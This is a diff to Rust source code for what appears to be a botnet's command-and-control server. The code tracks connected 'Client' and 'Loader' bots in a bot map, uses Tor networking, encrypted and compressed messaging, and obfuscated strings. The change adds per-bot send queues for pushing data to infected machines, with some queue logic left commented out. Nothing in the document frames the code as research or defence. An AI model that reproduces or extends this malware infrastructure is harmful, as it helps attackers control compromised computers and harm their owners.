@@ -1,4 +1,5 @@
 use std::collections::HashMap;
+use std::collections::VecDeque;
 use std::io::Cursor;
 use std::net::SocketAddr;
 use std::time::Duration;
@@ -10,6 +11,7 @@ use loader_vars::types::receive::LdrRcv;
 use loader_vars::types::send::LdrSnd;
 use shared::constants::communication_encryption_key;
 use shared::network::tor::MutexPtr;
+use shared::network::tor::RwPtr;
 use shared::network::tor::ServerReceive;
 use shared::network::tor::SrvRcvTp;
 use shared::utils::config::MibCnfg;
@@ -24,6 +26,7 @@ use obfstr::obfstr as s;
 use tokio::net::TcpStream;
 use tokio::sync::Mutex;
 use tokio::sync::RwLock;
+use tokio::time::interval;
 use tokio::time::timeout;
 use std::sync::Arc;
 use client_vars::types::structs::BotState;
@@ -34,6 +37,12 @@ use flate2::read::ZlibDecoder;
 use flate2::write::ZlibEncoder;
 use flate2::Compression;
 use std::io::{ Read, Write, BufReader, BufWriter };
+
+#[derive(Debug, Clone)]
+pub enum BotType {
+    Client,
+    Loader,
+}
 
 #[derive(Debug, Clone)]
 pub struct ClientInstance {
@@ -80,11 +89,15 @@ impl Bot {
     }
 }
 pub type BotMap = HashMap<String, Bot>;
+pub type SendQueue = VecDeque<Vec<u8>>;
 
 #[derive(Debug, Clone)]
 pub struct ServerHandler {
     listener: Arc<RwLock<TcpListener>>,
     pub bot_map: Arc<RwLock<BotMap>>,
+    pub loader_send_queue: HashMap<String, HashMap<u64, MutexPtr<SendQueue>>>,
+    pub client_send_queue: HashMap<String, HashMap<u64, MutexPtr<SendQueue>>>,
+    pub queue_tick_interval_ms: RwPtr<u64>,
 }
 
 impl ServerHandler {
@@ -96,6 +109,9 @@ impl ServerHandler {
         Ok(ServerHandler {
             listener: Arc::new(RwLock::new(listener)),
             bot_map: Arc::new(RwLock::new(HashMap::new())),
+            loader_send_queue: HashMap::new(),
+            client_send_queue: HashMap::new(),
+            queue_tick_interval_ms: Arc::new(RwLock::new(10)),
         })
     }
     pub async fn listen_for_connections(&mut self) -> Result<()> {
@@ -119,6 +135,9 @@ impl ServerHandler {
 
     async fn handle_stream(&self, stream: TcpStream) -> Result<()> {
         let stream_reference = Arc::new(Mutex::new(stream));
+        let queue_stream = stream_reference.clone();
+        let queue_self = self.clone();
+
         loop {
             println!("reading data");
             let data = match Self::read_data(stream_reference.clone()).await {
@@ -126,7 +145,7 @@ impl ServerHandler {
                 Err(error) => {
                     eprintln!("read_data error: {}", error);
                     if error.to_string().contains("Stream is closed") {
-                        stream_reference.lock().await.shutdown().await;
+                        stream_reference.lock().await.shutdown().await?;
                         return Ok(());
                     }
                     continue;
@@ -188,7 +207,7 @@ impl ServerHandler {
             // };
         }
 
-        println!("length read: {}", data_length);
+        println!("compressed data len: {}", data_length);
 
         let mut stream = stream_ref.lock().await;
 
@@ -208,7 +227,7 @@ impl ServerHandler {
         data: Vec<u8>,
         stream_ref: MutexPtr<TcpStream>
     ) -> Result<()> {
-        println!("data: {:#?}", data);
+        // println!("data: {:#?}", data);
         let decrypted_data = sauron_decrypt(
             convert_key_to_bytes(&communication_encryption_key()),
             &data
@@ -216,7 +235,6 @@ impl ServerHandler {
         let data: ServerReceive = serde_json
             ::from_slice(&decrypted_data)
             .context(s!("Failed to parse decrypted_data as ServerReceive").to_string())?;
-        println!("server receive: {:#?}", data);
 
         match data.server_receive_type {
             SrvRcvTp::Ldr => {
@@ -266,7 +284,6 @@ impl ServerHandler {
     }
 
     async fn encrypt_compress_and_send(stream_ref: MutexPtr<TcpStream>, data: &[u8]) -> Result<()> {
-        println!("server sending data, len: {}", data.len());
         let encrypted_data = sauron_encrypt(
             convert_key_to_bytes(&communication_encryption_key()),
             data
@@ -291,6 +308,96 @@ impl ServerHandler {
         stream.flush().await.context(s!("Failed to flush stream").to_string())?;
         Ok(())
     }
+
+    // pub async fn client_send_queue_task(
+    //     &self,
+    //     stream_ref: MutexPtr<TcpStream>,
+    //     bot_id: String,
+    //     version: u64
+    // ) -> ! {
+    //     let mut interval = interval(
+    //         Duration::from_millis(self.queue_tick_interval_ms.read().await.to_owned())
+    //     );
+    //     loop {
+    //         interval.tick().await;
+    //         let mut queue = self.client_send_queue
+    //             .get(&bot_id)
+    //             .unwrap()
+    //             .get(&version)
+    //             .unwrap()
+    //             .lock().await;
+    //         while let Some(data) = queue.pop_front() {
+    //             if
+    //                 let Err(error) = Self::encrypt_compress_and_send(
+    //                     stream_ref.clone(),
+    //                     &data
+    //                 ).await
+    //             {
+    //             }
+    //         }
+    //     }
+    // }
+    // pub async fn loader_send_queue_task(
+    //     &self,
+    //     stream_ref: MutexPtr<TcpStream>,
+    //     bot_id: String,
+    //     version: u64
+    // ) -> ! {
+    //     let mut interval = interval(
+    //         Duration::from_millis(self.queue_tick_interval_ms.read().await.to_owned())
+    //     );
+    //     loop {
+    //         interval.tick().await;
+    //         let mut queue = self.loader_send_queue
+    //             .get(&bot_id)
+    //             .unwrap()
+    //             .get(&version)
+    //             .unwrap()
+    //             .lock().await;
+    //         while let Some(data) = queue.pop_front() {
+    //             if
+    //                 let Err(error) = Self::encrypt_compress_and_send(
+    //                     stream_ref.clone(),
+    //                     &data
+    //                 ).await
+    //             {
+    //             }
+    //         }
+    //     }
+    // }
+    // pub async fn add_to_send_queue(
+    //     &self,
+    //     bot_type: BotType,
+    //     bot_id: String,
+    //     version: u64,
+    //     data: Vec<u8>
+    // ) -> Result<()> {
+    //     match bot_type {
+    //         BotType::Client => {
+    //             if let Some(queue) = self.client_send_queue.get(&bot_id) {
+    //                 if let Some(queue) = queue.get(&version) {
+    //                     queue.lock().await.push_back(data);
+    //                 } else {
+    //                     eprintln!("ERROR ADDING TO SEND Client QUEUE - BOT VERSION DONT EXIST: {}", version);
+    //                 }
+    //             } else {
+    //                 eprintln!("ERROR ADDING TO SEND Client QUEUE - BOT ID DONT EXIST: {}", bot_id);
+    //             }
+    //         }
+    //         BotType::Loader => {
+    //             if let Some(queue) = self.loader_send_queue.get(&bot_id) {
+    //                 if let Some(queue) = queue.get(&version) {
+    //                     queue.lock().await.push_back(data);
+    //                 } else {
+    //                     eprintln!("ERROR ADDING TO SEND Loader QUEUE - BOT VERSION DONT EXIST: {}", version);
+    //                 }
+    //             } else {
+    //                 eprintln!("ERROR ADDING TO SEND Loader QUEUE - BOT ID DONT EXIST: {}", bot_id);
+    //             }
+    //         }
+    //     }
+    //     Ok(())
+    // }
 }
 
 // pub async fn route_boogeyman(
